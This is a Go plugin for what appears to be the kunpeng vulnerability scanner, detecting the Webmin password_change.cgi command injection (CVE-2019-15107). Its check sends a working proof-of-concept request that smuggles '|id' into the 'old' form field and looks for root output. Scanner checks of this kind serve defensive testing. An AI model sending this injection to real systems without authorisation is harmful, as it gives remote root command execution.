package goplugin

import (
	"net/http"
	"strings"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type webminRCE struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("webmin", &webminRCE{})
}
func (d *webminRCE) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "Webmin 远程命令注入/执行",
		Remarks: "Webmin是一个用于管理类Unix系统的管理配置工具，具有Web页面。在其找回密码页面中，存在一处无需权限的命令注入漏洞，通过这个漏洞攻击者即可以执行任意系统命令。",
		Level:   0,
		Type:    "RCE",
		Author:  "wolf",
		References: plugin.References{
			URL:  "https://github.com/vulhub/vulhub/blob/master/webmin/CVE-2019-15107/README.zh-cn.md",
			CVE:  "CVE-2019-15107",
			KPID: "KP-0086",
		},
	}
	return d.info
}
func (d *webminRCE) GetResult() []plugin.Plugin {
	var result = d.result
	d.result = []plugin.Plugin{}
	return result
}
func (d *webminRCE) Check(URL string, meta plugin.TaskMeta) bool {
	poc := `user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2`
	request, err := http.NewRequest("POST", URL+"/password_change.cgi", strings.NewReader(poc))
	if err != nil {
		return false
	}
	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	request.Header.Set("Referer", URL+"/session_login.cgi")
	resp, err := util.RequestDo(request, true)
	if err != nil {
		return false
	}
	if strings.Contains(resp.ResponseRaw, "incorrectuid=0") {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
